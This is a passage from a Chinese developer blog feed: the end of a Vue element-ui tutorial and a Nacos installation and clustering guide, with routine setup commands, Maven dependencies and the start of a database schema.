href="http://mint-ui.github.io/">Mint UI</a></p><p><a href="https://nutui.jd.com/#/">https://nutui.jd.com/#/</a></p></li><li><p>PC端常用UI组件库</p><p><a href="https://element.eleme.cn/">Element UI</a></p><p><a href="https://www.iviewui.com/">IView UI</a></p></li></ol><h2 id="5-2-element-ui基本使用"><a href="#5-2-element-ui基本使用" class="headerlink" title="5.2. element-ui基本使用"></a>5.2. element-ui基本使用</h2><ol><li><p>lement-ui：npm i element-ui -S </p></li><li><p>src&#x2F;main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ElementUI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;<span class="hljs-comment">// 引入ElementUI组件库</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;<span class="hljs-comment">// 引入ElementUI全部样式</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">ElementUI</span>)<span class="hljs-comment">// 使用ElementUI</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>src&#x2F;App.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;template&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-search&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-edit&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-check&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;info&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-message&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-star-off&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-delete&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li></ol><h2 id="5-3element-ui按需引入"><a href="#5-3element-ui按需引入" class="headerlink" title="5.3element-ui按需引入"></a>5.3element-ui按需引入</h2><ol><li><p>安装 babel-plugin-componentnpm i babel-plugin-component -D </p></li><li><p>修改 babel-config-js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">presets</span>: [<br>    <span class="hljs-string">&#x27;@vue/cli-plugin-babel/preset&#x27;</span>,<br>    [<span class="hljs-string">&quot;@babel/preset-env&quot;</span>, &#123; <span class="hljs-string">&quot;modules&quot;</span>: <span class="hljs-literal">false</span> &#125;]<br>  ],<br>  <span class="hljs-attr">plugins</span>: [<br>    [<br>      <span class="hljs-string">&quot;component&quot;</span>,<br>      &#123;        <br>        <span class="hljs-string">&quot;libraryName&quot;</span>: <span class="hljs-string">&quot;element-ui&quot;</span>,<br>        <span class="hljs-string">&quot;styleLibraryName&quot;</span>: <span class="hljs-string">&quot;theme-chalk&quot;</span><br>      &#125;<br>    ]<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>src&#x2F;main.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span>,<span class="hljs-title class_">Row</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span><span class="hljs-comment">// 按需引入</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-title class_">Button</span>.<span class="hljs-property">name</span>, <span class="hljs-title class_">Button</span>);<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-title class_">Row</span>.<span class="hljs-property">name</span>, <span class="hljs-title class_">Row</span>);<br><span class="hljs-comment">/* 或写为</span><br><span class="hljs-comment"> * Vue.use(Button)</span><br><span class="hljs-comment"> * Vue.use(Row)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><p>参考文章：</p><ol><li>尚硅谷主讲的vue：<a href="https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&amp;spm_id_from=pageDriver">https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&amp;spm_id_from=pageDriver</a></li><li>现代JavaScript：<a href="https://zh.javascript.info/">https://zh.javascript.info/</a></li><li>MDN文档：<a href="https://developer.mozilla.org/zh-CN/docs/Web">https://developer.mozilla.org/zh-CN/docs/Web</a></li><li>我是你的超级英雄 <a href="https://juejin.cn/post/6844903895467032589">https://juejin.cn/post/6844903895467032589</a></li><li>格雷狐思的vue基础用法&amp;基础原理整理 <a href="https://blog.csdn.net/hangao233/article/details/123990192?spm=1001.2014.3001.5502">https://blog.csdn.net/hangao233/article/details/123990192?spm=1001.2014.3001.5502</a></li><li>cess的VUE笔记 <a href="https://www.yuque.com/cessstudy/kak11d">前端 (yuque.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
      <category>Vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacos使用指南</title>
    <link href="/2022/11/23/Nacos%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2022/11/23/Nacos%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Windows安装"><a href="#1-Windows安装" class="headerlink" title="1.Windows安装"></a>1.Windows安装</h1><p>开发阶段采用单机安装即可。</p><h2 id="1-1-下载安装包"><a href="#1-1-下载安装包" class="headerlink" title="1.1.下载安装包"></a>1.1.下载安装包</h2><p>在Nacos的GitHub页面，提供有下载链接，可以下载编译好的Nacos服务端或者源代码：</p><p>GitHub主页：<a href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p><p>GitHub的Release下载页：<a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p>如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951713.png" alt="image-20210402161102887"></p><p>也可以到我的网盘进行下载，<a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">网盘连接</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png" alt="image-20221123092819398"></p><p>windows版本使用<code>nacos-server-1.4.1.zip</code>包即可。</p><h2 id="1-2-解压"><a href="#1-2-解压" class="headerlink" title="1.2.解压"></a>1.2.解压</h2><p>将这个包解压到任意非中文目录下，如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951644.png" alt="image-20210402161843337"></p><p>目录说明：</p><ul><li>bin：启动脚本</li><li>conf：配置文件</li></ul><h2 id="1-3-端口配置"><a href="#1-3-端口配置" class="headerlink" title="1.3.端口配置"></a>1.3.端口配置</h2><p>Nacos的默认端口是8848，如果你电脑上的其它进程占用了8848端口，请先尝试关闭该进程。</p><p><strong>如果无法关闭占用8848端口的进程</strong>，也可以进入nacos的conf目录，修改配置文件中的端口：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951753.png" alt="image-20210402162008280"></p><p>修改其中的内容：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951804.png" alt="image-20210402162251093"></p><h2 id="1-4-启动"><a href="#1-4-启动" class="headerlink" title="1.4.启动"></a>1.4.启动</h2><p>启动非常简单，进入bin目录，结构如下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951672.png" alt="image-20210402162350977"></p><p>然后执行命令即可：</p><ul><li><p>windows命令：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">startup.<span class="hljs-built_in">cmd</span> -m standalone<br></code></pre></td></tr></table></figure></li></ul><p>执行后的效果如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951926.png" alt="image-20210402162526774"></p><h2 id="1-5-访问"><a href="#1-5-访问" class="headerlink" title="1.5.访问"></a>1.5.访问</h2><p>在浏览器输入地址：<a href="http://127.0.0.1:8848/nacos%E5%8D%B3%E5%8F%AF%EF%BC%9A">http://127.0.0.1:8848/nacos即可：</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951194.png" alt="image-20210402162630427"></p><p>默认的账号和密码都是nacos，进入后：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951179.png" alt="image-20210402162709515"></p><h1 id="2-Linux安装"><a href="#2-Linux安装" class="headerlink" title="2.Linux安装"></a>2.Linux安装</h1><p>Linux或者Mac安装方式与Windows类似。</p><h2 id="2-1-安装JDK"><a href="#2-1-安装JDK" class="headerlink" title="2.1.安装JDK"></a>2.1.安装JDK</h2><p>Nacos依赖于JDK运行，索引Linux上也需要安装JDK才行。</p><p><a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">JDK网盘下载连接</a></p><p>上传jdk安装包</p><p>上传到某个目录，例如：**&#x2F;usr&#x2F;local&#x2F;**</p><p>然后解压缩：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf jdk-8u144-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>然后重命名为java</p><p>配置环境变量：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> JAVA_HOME=/usr/local/java<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br></code></pre></td></tr></table></figure><p>设置环境变量：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure><h2 id="2-2-上传安装包"><a href="#2-2-上传安装包" class="headerlink" title="2.2.上传安装包"></a>2.2.上传安装包</h2><p>如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951713.png" alt="image-20210402161102887"></p><p>也可以直接使用我的<a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">网盘</a>中的tar.gz：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png"></p><p>上传到Linux服务器的某个目录，例如<code>/usr/local/src</code>目录下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951277.png" alt="image-20210402163715580"></p><h2 id="2-3-解压"><a href="#2-3-解压" class="headerlink" title="2.3.解压"></a>2.3.解压</h2><p>命令解压缩安装包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf nacos-server-1.4.1.tar.gz<br></code></pre></td></tr></table></figure><p>然后删除安装包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -rf nacos-server-1.4.1.tar.gz<br></code></pre></td></tr></table></figure><p>目录中最终样式：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951323.png" alt="image-20210402163858429"></p><p>目录内部：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951330.png" alt="image-20210402164414827"></p><h2 id="2-4-端口配置"><a href="#2-4-端口配置" class="headerlink" title="2.4.端口配置"></a>2.4.端口配置</h2><p>与windows中类似</p><h2 id="2-5-启动"><a href="#2-5-启动" class="headerlink" title="2.5.启动"></a>2.5.启动</h2><p>在nacos&#x2F;bin目录中，输入命令启动Nacos：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sh startup.sh -m standalone<br></code></pre></td></tr></table></figure><h1 id="3-Nacos的依赖"><a href="#3-Nacos的依赖" class="headerlink" title="3.Nacos的依赖"></a>3.Nacos的依赖</h1><p>父工程：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- nacos客户端依赖包 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="4-集群结构图"><a href="#4-集群结构图" class="headerlink" title="4.集群结构图"></a>4.集群结构图</h1><p>官方给出的Nacos集群图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026460.png" alt="image-20210409210621117"></p><p>其中包含3个nacos节点，然后一个负载均衡器代理3个Nacos。这里负载均衡器可以使用nginx。</p><p>我们计划的集群结构：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026231.png" alt="image-20210409211355037"></p><p>三个nacos节点的地址：</p><table><thead><tr><th>节点</th><th>ip</th><th>port</th></tr></thead><tbody><tr><td>nacos1</td><td>192.168.150.1</td><td>8845</td></tr><tr><td>nacos2</td><td>192.168.150.1</td><td>8846</td></tr><tr><td>nacos3</td><td>192.168.150.1</td><td>8847</td></tr></tbody></table><h1 id="5-搭建集群"><a href="#5-搭建集群" class="headerlink" title="5.搭建集群"></a>5.搭建集群</h1><p>搭建集群的基本步骤：</p><ul><li>搭建数据库，初始化数据库表结构</li><li>下载nacos安装包</li><li>配置nacos</li><li>启动nacos集群</li><li>nginx反向代理</li></ul><h2 id="5-1-初始化数据库"><a href="#5-1-初始化数据库" class="headerlink" title="5.1.初始化数据库"></a>5.1.初始化数据库</h2><p>Nacos默认数据存储在内嵌数据库Derby中，不属于生产可用的数据库。</p><p>官方推荐的最佳实践是使用带有主从的高可用数据库集群。</p><p>这里我们以单点的数据库为例来讲解。</p><p>首先新建一个数据库，命名为nacos，而后导入下面的SQL：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;租户字段&#x27;</span>,<br>  `c_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `c_use` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `effect` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `c_schema` text,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span 